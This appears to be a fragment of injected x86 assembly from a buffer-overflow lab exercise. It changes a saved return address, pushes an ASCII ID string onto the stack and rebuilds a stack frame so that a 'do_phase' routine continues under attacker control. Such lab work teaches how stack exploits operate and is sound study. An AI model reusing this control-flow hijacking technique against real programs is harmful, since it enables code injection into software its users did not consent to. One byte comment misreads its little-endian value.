pop    %eax           
add    $0xa,%eax     # change return address
push   $0x36
push   $0x32333231  # push "2312" as 0x32333231 (little-endian)
push   $0x35303930  # push “2095" as 0x35303930 (little-endian)
mov    %esp,%ecx
push   %ecx          # push the starting address of my id
push   %eax          # push return address
push   %ebp          # original do_phase here
mov    %esp,%ebp
